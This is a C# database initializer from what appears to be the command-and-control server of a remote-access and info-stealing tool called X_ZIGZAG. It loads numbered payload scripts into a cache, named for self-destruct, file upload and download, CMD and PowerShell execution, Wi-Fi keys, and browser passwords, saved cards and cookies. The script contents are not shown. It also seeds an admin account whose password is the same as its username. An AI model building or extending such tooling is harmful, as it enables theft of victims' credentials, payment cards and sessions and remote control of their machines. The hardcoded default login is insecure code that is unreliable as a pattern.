using X_ZIGZAG_SERVER_WEB_API.Models;

namespace X_ZIGZAG_SERVER_WEB_API.Data
{
    using BCrypt.Net;
    using Microsoft.Extensions.Caching.Memory;
    using Microsoft.Extensions.Hosting;
    using System;

    public class DbInitializer
    {
        public static void Initialize(MyDbContext context,IMemoryCache cache , IHostEnvironment hostEnvironment)
        {
            cache.Set(-1, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "SELF_DESTRUCT.txt")));
            cache.Set(0, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "UPLOAD.txt")));
            cache.Set(1, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "DOWNLOAD.txt")));
            cache.Set(2, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "CMD.txt")));
            cache.Set(3, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "POWERSHELL.txt"))); 
            // 4
            cache.Set(5, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "WIFI.txt")));
            cache.Set(6, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_PASSWORDS.txt")));
            cache.Set(7, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_CARDS.txt")));
            cache.Set(8, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "BROWSER_COOKIES.txt")));
            cache.Set(9, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "CSHARP.txt")));
            cache.Set(10, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "VB.txt")));
            cache.Set(11, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "MUTE_UNMUTE.txt")));
            cache.Set(12, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "VOLUME_UP.txt")));
            cache.Set(13, ReadTextFile(Path.Combine(hostEnvironment.ContentRootPath, "Scripts", "VOLUME_DOWN.txt")));
            context.Database.EnsureCreated();
            if (context.Admins.Any())
            {
                return;   
            }
            var entities = new Admin {
               Id= Guid.NewGuid().ToString(),
               Username="xzigzag",
               Password= BCrypt.HashPassword("xzigzag"),
            };
            context.Admins.Add(entities);
            context.SaveChanges();
        }
        public static string ReadTextFile(string filePath)
        {
            if (File.Exists(filePath))
            {
                return File.ReadAllText(filePath);
            }
            else
            {
                return "";
            }
        }
    }
}
